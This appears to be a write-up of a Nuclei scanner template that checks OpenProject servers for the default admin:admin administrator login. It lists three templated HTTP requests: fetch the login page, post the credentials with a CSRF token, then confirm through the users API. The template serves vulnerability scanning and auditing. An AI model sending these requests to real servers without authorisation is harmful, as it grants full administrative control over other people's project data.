# Nuclei Template: OpenProject - Default Admin Credentials
**Template ID:** openproject-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`openproject-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected OpenProject was found using the default administrator credentials admin:admin. An attacker could gain full administrative control, including user management, project data, and system configuration.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}

POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

authenticity_token={{url_encode(csrf_token)}}&username={{username}}&password={{password}}&login=Sign+in

GET /api/v3/users/me HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.openproject.org/docs/installation-and-operations/installation/manual/
- https://www.openproject.org/docs/api/introduction/
- https://github.com/opf/openproject
